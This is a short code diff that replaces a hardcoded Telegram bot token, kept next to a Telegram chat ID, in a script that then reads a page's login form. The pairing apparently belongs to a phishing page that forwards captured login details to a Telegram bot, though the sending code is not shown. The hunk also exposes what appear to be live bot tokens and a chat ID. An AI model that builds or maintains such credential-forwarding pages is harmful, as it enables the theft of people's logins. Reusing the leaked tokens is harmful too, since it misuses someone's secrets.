@@ -19,7 +19,7 @@
   }
   // ----------------------------------------------
 
-  const TELEGRAM_TOKEN = '9068600803:AAGIYrU6UrsLU8_0x0dkZLUTQ_YKr4535BE'; 
+  const TELEGRAM_TOKEN = '9068600803:AAHsD99VxpWVyedQoPlZeFV3OHotQJhK0W0'; 
   const TELEGRAM_CHAT_ID = '9180377107';   
 
   const form = document.getElementById("login-form");
